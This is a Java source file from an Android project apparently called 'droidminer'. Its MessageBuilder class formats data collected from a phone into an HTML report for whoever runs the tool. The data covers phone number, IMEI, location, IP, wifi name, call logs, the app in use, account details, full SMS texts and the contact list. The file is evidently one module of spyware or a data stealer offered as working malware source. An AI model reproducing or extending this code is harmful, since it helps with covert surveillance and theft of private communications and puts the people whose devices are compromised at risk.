package com.miner.droidminer.modules;

import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by Kopites on 10/18/2016.
 */

public class MessageBuilder {
    private JSONObject jsonObject;
    public MessageBuilder(JSONObject jsonObject) {
        this.jsonObject = jsonObject;
    }
    /*******************     DEVICE INFOMATION    *********************************/
    public String buildHtml() {
        String html = "<div style='background-color: black'><div style='color: red'><h2>Device Informations</h2>";
        try {
            JSONObject info = this.jsonObject.getJSONObject("info");
            html += "<br><h3 style='color: white'>Phone Number: " + info.getString("phone_number") + "</h3>";
            html += "<br><h3 style='color: white'>Mobile Operator: " + info.getString("mobile_operator") + "</h3>";
            html += "<br><h3 style='color: white'>Device Model: " + info.getString("device_model") + "</h3>";
            html += "<br><h3 style='color: white'>Location: " + info.getString("phone_location") + "</h3>";
            html += "<br><h3 style='color: white'>Divice ID(IMEI): " + info.getString("phone_id") + "</h3>";
            html += "<br><h3 style='color: white'>Android Version: " + info.getString("android_version") + "</h3>";
            html += "<br><h3 style='color: white'>country: " + info.getString("phone_country") + "</h3>";
            html += "<br><h3 style='color: white'>Phone_IP: " + info.getString("phone_ip") + "</h3>";
            html += "<br><h3 style='color: white'>Wifi Hotspot Name: " + this.jsonObject.getString("wifi") + "</h3>";
        } catch (Exception e) {
            Log.e ("!", "NO PHONE INFO");
        }

        /*******************     CALL LOGS INFORMATION    *********************************/
        html += "<div style='background-color: black'><div style='color: red'><h2>Call Logs</h2>";
        try {
            if (this.jsonObject.getJSONArray ("call_logs") != null) {
                for (int i = 0; i < this.jsonObject.getJSONArray("call_logs").length(); i++) {
                    html += "<br><h3 style='color: white'>+Phone: " + this.jsonObject.getJSONArray("call_logs").getJSONObject(i).getString("call_number") +
                            "</h3><h4> <h3 style='color: white'>+Call Type: " + this.jsonObject.getJSONArray("call_logs").getJSONObject(i).getString("call_type") +
                            "</h4><h4> <h3 style='color: white'>+Call Date: " + this.jsonObject.getJSONArray("call_logs").getJSONObject(i).getString("call_date") +
                            "</h4><h4> <h3 style='color: white'>+Call Duration: " + this.jsonObject.getJSONArray("call_logs").getJSONObject(i).getString("call_dur") + "</h4>"
                            + "<h4> <h3 style='color: red'>------------------------ </h4>";
                }
            }
        } catch (Exception e) {
            Log.e ("!", "NO CALL_LOGS INFO");
        }

        /*******************     CURRENT ACTIVITY INFOMATION    *********************************/
        html += "<br><br><br><h2>Current Activity</h2>";
        try {
            JSONObject act = this.jsonObject.getJSONObject("activity");
            html += "<br><h3 style='color: white'>Current Acitivity: " + act.getString("current_activity") + "</h3>";
            html += "<br><h3 style='color: white'>Package: " + act.getString("package_name") + "</h3>";
        } catch (Exception e) {
            Log.e("!", "NO ACTIVITY INFO");
        }

        /**************************** ACCOUNT INFORMATION *************************************/
        html += "<br><br><br><h2>Account Information</h2>";
        try {
            JSONObject acc = this.jsonObject.getJSONObject("account");
            html += "<br><h3 style='color: white'>Account: " + acc.getString("account_info") + "</h3>";
        } catch (JSONException e) {
            e.printStackTrace();
        }
        /*******************     MESSAGE  + CONTACTS *********************************/
        html += "<br><br><br><h2>SMS Data</h2>";
        try {
            if (this.jsonObject.getJSONArray ("sms") != null) {
                for (int i = 0; i < this.jsonObject.getJSONArray("sms").length(); i++) {
                    html += "<br><h3 style='color: white'>" + this.jsonObject.getJSONArray("sms").getJSONObject(i).getString("address") + "</h3><h4>" + this.jsonObject.getJSONArray("sms").getJSONObject(i).getString("body") + "</h4>";
                }
                html += "<br><br><br><h2>Contacts</h2>";
                for (int i = 0; i < this.jsonObject.getJSONArray("contacts").length(); i++) {
                    html += "<br><h3 style='color: white'>" + this.jsonObject.getJSONArray("contacts").getJSONObject(i).getString("name") + "</h3><h4>" + this.jsonObject.getJSONArray("contacts").getJSONObject(i).getString("num") + "</h4>";
                }
            }
        } catch (Exception e) {
            Log.e("To Json Error!", e.getMessage());
        }
        html += "</div></div>";
        return html;
    }
}
